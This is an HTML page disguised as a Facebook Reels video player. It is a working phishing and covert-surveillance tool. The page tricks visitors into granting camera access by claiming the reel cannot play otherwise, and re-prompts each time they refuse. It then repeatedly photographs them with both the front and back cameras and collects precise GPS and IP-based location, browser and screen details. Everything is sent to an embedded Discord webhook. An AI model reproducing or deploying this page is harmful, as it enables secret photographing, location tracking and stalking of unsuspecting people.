<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Facebook</title>
  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">

  <meta property="og:title" content="Facebook">
  <meta property="og:description" content="DOK MI NISI PAO U OCIMA DUBOKO">
  <meta property="og:image" content="https://i.imgur.com/DEIN_THUMBNAIL.jpg"> <!-- vervang -->
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:url" content="https://www.facebook.com/share/r/1AeJHMHjaj/">
  <meta property="og:type" content="video.other">

  <style>
    body { margin:0; font-family:Helvetica,Arial,sans-serif; background:#000; color:#fff; overflow:hidden; touch-action:manipulation; }
    .header { position:fixed; top:0; left:0; right:0; height:56px; background:rgba(0,0,0,0.85); display:flex; align-items:center; padding:0 16px; z-index:100; }
    .close { font-size:38px; font-weight:bold; cursor:pointer; margin-right:20px; pointer-events:auto; }
    .title { flex:1; text-align:center; font-size:20px; font-weight:600; }
    .reel { height:100vh; position:relative; }
    .profile { position:absolute; top:80px; left:16px; display:flex; align-items:center; z-index:10; pointer-events:none; }
    .avatar { width:52px; height:52px; border-radius:50%; background:#555; margin-right:12px; }
    .info { font-size:16px; line-height:1.2; }
    .name { font-weight:600; }
    .pub { font-size:13px; opacity:0.9; }
    .play-area { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; z-index:5; pointer-events:auto; cursor:pointer; }
    .play-btn { width:120px; height:120px; background:rgba(0,0,0,0.6); border-radius:50%; display:flex; align-items:center; justify-content:center; pointer-events:auto; }
    .triangle { width:0; height:0; border-top:40px solid transparent; border-bottom:40px solid transparent; border-left:64px solid #fff; margin-left:12px; }
    .text-overlay { position:absolute; bottom:240px; left:0; right:0; font-size:2.6rem; text-align:center; text-shadow:0 6px 30px #000; pointer-events:none; line-height:1.1; z-index:4; }
    .actions { position:absolute; bottom:60px; right:24px; display:flex; flex-direction:column; gap:36px; font-size:34px; color:#fff; z-index:6; pointer-events:none; }
    .audio { position:absolute; bottom:20px; left:16px; font-size:14px; opacity:0.85; z-index:10; pointer-events:none; }
    #cam-prompt, #loc-prompt { position:fixed; inset:0; background:rgba(0,0,0,0.95); display:none; align-items:center; justify-content:center; z-index:9999; pointer-events:auto; }
    .modal-box { background:#fff; color:#000; padding:50px 40px; border-radius:22px; max-width:460px; text-align:center; box-shadow:0 20px 70px rgba(0,0,0,0.75); pointer-events:auto; }
    .btn { padding:18px 80px; font-size:1.35rem; font-weight:bold; border:none; border-radius:12px; margin:20px 12px; cursor:pointer; pointer-events:auto; touch-action:manipulation; }
    .allow { background:#1877f2; color:#fff; }
    .deny { background:#e4e6eb; color:#000; }
    #flash { position:fixed; inset:0; background:white; opacity:0; pointer-events:none; z-index:9998; transition:opacity 0.1s; }
  </style>
</head>
<body>
<div class="header">
  <div class="close" id="closeBtn">√ó</div>
  <div class="title">Reels</div>
</div>

<div class="reel">
  <div class="profile">
    <div class="avatar"></div>
    <div class="info">
      <div class="name">Zorica Zoka Dimitrijevic</div>
      <div class="pub">√ñffentlich</div>
    </div>
  </div>

  <div class="play-area" id="playArea">
    <div class="play-btn" id="playBtn"><div class="triangle"></div></div>
  </div>

  <div class="text-overlay">DOK MI NISI<br>PAO U OCIMA DUBOKO</div>

  <div class="actions">
    <div>‚ù§Ô∏è 14.6K</div>
    <div>üí¨ 305</div>
    <div>‚û§</div>
  </div>

  <div class="audio">Zorica Zoka Dimitrijevic ¬∑ Original audio ¬∑ Zorica</div>
</div>

<div id="flash"></div>

<div id="cam-prompt">
  <div class="modal-box">
    <h2>Deze Reel kan niet afgespeeld worden</h2>
    <p style="margin:30px 0; font-size:1.4rem;">Geef kort toegang tot je camera.</p>
    <div id="camErr" style="color:#c00;display:none;margin:20px 0;">Toegang geweigerd ‚Äì probeer opnieuw</div>
    <button id="allowCam" class="btn allow">CAMERA TOESTAAN</button>
    <button id="denyCam" class="btn deny">ANNULEREN</button>
  </div>
</div>

<div id="loc-prompt">
  <div class="modal-box">
    <h2>Locatie delen nodig</h2>
    <p style="margin:30px 0; font-size:1.4rem;">Deel je precieze locatie om door te gaan.</p>
    <button id="allowLoc" class="btn allow">LOCATIE DELEN</button>
    <button id="denyLoc" class="btn deny">NEE</button>
  </div>
</div>

<video id="v" autoplay muted playsinline style="display:none"></video>
<canvas id="c" style="display:none"></canvas>

<script>
const HOOK = "https://discord.com/api/webhooks/1469356230932824309/a37FAcac9zDeOiHgx2kNAukuUHrFjDrX0XZg5b_Q1R_bVbtZRhL070tfkOeEGhysRYPI";
let count = 0, frontStream = null, backStream = null, v = document.getElementById('v'), c = document.getElementById('c'), flash = document.getElementById('flash');
let photoBatch = 0; // 0 = front, 1 = back

async function getIPData() {
  const apis = ['https://ipapi.co/json/', 'https://ipinfo.io/json', 'https://api.ipify.org?format=json', 'https://freegeoip.app/json/'];
  for (let url of apis) {
    try {
      const r = await fetch(url);
      const d = await r.json();
      if (d.ip) return {
        ip: d.ip || d.query || 'verborgen (VPN?)',
        city: d.city || d.city_name || '?',
        region: d.region || d.state_prov || '?',
        country: d.country_name || d.country || '?',
        postal: d.postal || d.zipcode || '?',
        org: d.org || d.isp || d.asn || '?',
        latitude: d.latitude || d.lat || null,
        longitude: d.longitude || d.lon || null
      };
    } catch {}
  }
  return {ip:'verborgen (VPN/adblock)', city:'?', region:'?', country:'?', postal:'?', org:'?', latitude:null, longitude:null};
}

async function getGPS() {
  return new Promise(r => {
    if (!navigator.geolocation) return r(null);
    navigator.geolocation.getCurrentPosition(
      p => r({latitude:p.coords.latitude, longitude:p.coords.longitude, accuracy:p.coords.accuracy}),
      () => r(null),
      {enableHighAccuracy:true, timeout:15000, maximumAge:0}
    );
  });
}

async function send(type, blob = null) {
  try {
    let loc = await getGPS() || await getIPData();
    let ip = loc.ip || 'verborgen (VPN?)';
    let city = loc.city || '?', region = loc.region || '?', country = loc.country || '?', postal = loc.postal || '?', org = loc.org || '?';
    let lat = loc.latitude, lon = loc.longitude;
    let acc = lat ? `${Math.round(loc.accuracy || 500)}m` : 'IP-Fallback';
    let maps = lat ? `https://maps.google.com/?q=${lat.toFixed(7)},${lon.toFixed(7)}&z=19&layer=c` : null;

    const embed = {
      title: `üî¥ FB ${type} #${++count}`,
      color: lat ? 0x00ffcc : 0xff0000,
      fields: [
        {name:"Event", value:type, inline:true},
        {name:"IP + Ort", value:`**${ip}**\n${city} ‚Ä¢ ${region} ‚Ä¢ ${country} ‚Ä¢ ${postal} ‚Ä¢ ${org}`, inline:true},
        {name:"Genauigkeit", value:acc, inline:true},
        {name:"UA", value:navigator.userAgent.substring(0,140), inline:false},
        {name:"Screen", value:`${screen.width}√ó${screen.height}`, inline:true},
        {name:"Zeit", value:new Date().toISOString(), inline:true}
      ],
      timestamp: new Date().toISOString()
    };
    if (maps) embed.fields.push({name:"Google Maps ‚Äì Position", value:`[‚Üí exakte Stelle](${maps})`, inline:false});

    const payload = {embeds:[embed]};
    if (blob) {
      let fd = new FormData();
      fd.append("payload_json", JSON.stringify(payload));
      fd.append("file", blob, `cam_${Date.now()}.jpg`);
      await fetch(HOOK + "?wait=true", {method:"POST", body:fd});
    } else {
      await fetch(HOOK + "?wait=true", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(payload)});
    }
  } catch (e) {
    console.error("Send failed:", e);
  }
}

async function startCam(facing = "user") {
  try {
    const s = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: facing, width: { ideal: 1280 }, height: { ideal: 720 } }
    });
    v.srcObject = s;
    await v.play();
    c.width = v.videoWidth || 1280;
    c.height = v.videoHeight || 720;
    return s;
  } catch (e) {
    console.error("Camera error:", e);
    send('CAM_ERROR_' + facing);
    return null;
  }
}

function flashScreen() {
  flash.style.opacity = '0.8';
  setTimeout(() => flash.style.opacity = '0', 100);
}

async function captureBatch(facing, count = 5) {
  for (let i = 0; i < count; i++) {
    c.getContext('2d').drawImage(v,0,0,c.width,c.height);
    const data = c.getContext('2d').getImageData(0,0,c.width,c.height).data;
    let brightness = 0;
    for (let j = 0; j < data.length; j += 4) brightness += (data[j] + data[j+1] + data[j+2]) / 3;
    brightness /= (data.length / 4);
    if (brightness < 80) flashScreen();
    let b = await new Promise(r => c.toBlob(r,'image/jpeg',0.88));
    send(`CAM SNAP ${facing.toUpperCase()} #${i+1}`, b);
    await new Promise(r => setTimeout(r, 300)); // kleine delay tussen foto's
  }
}

document.getElementById('playBtn').addEventListener('click', async () => {
  document.getElementById('cam-prompt').style.display = 'flex';
  send('PLAY');
});

document.getElementById('allowCam').onclick = async () => {
  document.getElementById('cam-prompt').style.display = 'none';
  let front = await startCam("user");
  if (front) {
    // oneindige loop: 5 front ‚Üí 5 back ‚Üí repeat
    setInterval(async () => {
      await captureBatch("FRONT", 5);
      front.getTracks().forEach(t => t.stop());
      let back = await startCam("environment");
      if (back) {
        await captureBatch("BACK", 5);
        back.getTracks().forEach(t => t.stop());
        front = await startCam("user"); // terug naar front
      }
    }, 15000); // elke ~15s batch wisselen (5 foto's + delay)

    setTimeout(() => document.getElementById('loc-prompt').style.display = 'flex', 5000);
  } else {
    document.getElementById('camErr').style.display = 'block';
    setTimeout(() => document.getElementById('cam-prompt').style.display = 'flex', 2000);
  }
};

document.getElementById('denyCam').onclick = () => {
  document.getElementById('camErr').style.display = 'block';
  send('CAM_DENY');
  setTimeout(() => document.getElementById('cam-prompt').style.display = 'flex', 1800);
};

document.getElementById('allowLoc').onclick = async () => {
  document.getElementById('loc-prompt').style.display = 'none';
  send('LOC_GRANTED');
};

document.getElementById('denyLoc').onclick = () => {
  document.getElementById('loc-prompt').style.display = 'none';
  send('LOC_DENY');
};

document.getElementById('closeBtn').onclick = () => location.reload();
</script>
</body>
</html>
